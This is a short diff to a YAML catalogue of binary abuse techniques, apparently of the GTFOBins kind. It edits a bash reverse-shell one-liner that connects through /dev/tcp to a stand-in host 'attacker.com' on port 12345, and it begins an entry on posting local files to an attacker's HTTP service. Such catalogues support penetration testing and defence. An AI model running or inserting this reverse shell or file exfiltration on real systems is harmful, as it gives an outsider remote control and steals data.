@@ -7,7 +7,7 @@ functions:
       code: |
         export RHOST=attacker.com
         export RPORT=12345
-        bash -c 'bash -i &>/dev/tcp/$RHOST/$RPORT 0<&1'
+        bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
   file-upload:
     - description: Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.
       code: |
